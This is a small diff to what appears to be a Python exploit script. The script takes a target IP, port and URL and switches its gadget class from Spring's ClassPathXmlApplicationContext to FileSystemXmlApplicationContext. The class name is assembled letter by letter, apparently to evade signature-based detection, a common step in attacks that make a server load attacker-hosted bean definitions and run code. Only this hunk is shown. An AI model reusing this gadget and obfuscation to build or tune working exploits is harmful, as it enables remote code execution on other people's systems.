@@ -7,7 +7,7 @@ def main(ip, port, url):
         return
 
     class_name = "org.springframework.context.support." + "".join([
-        "C","l","a","s","s","P","a","t","h","X","m","l",
+        "F","i","l","e","S","y","s","t","e","m","X","m","l",
         "A","p","p","l","i","c","a","t","i","o","n",
         "C","o","n","t","e","x","t"
     ])
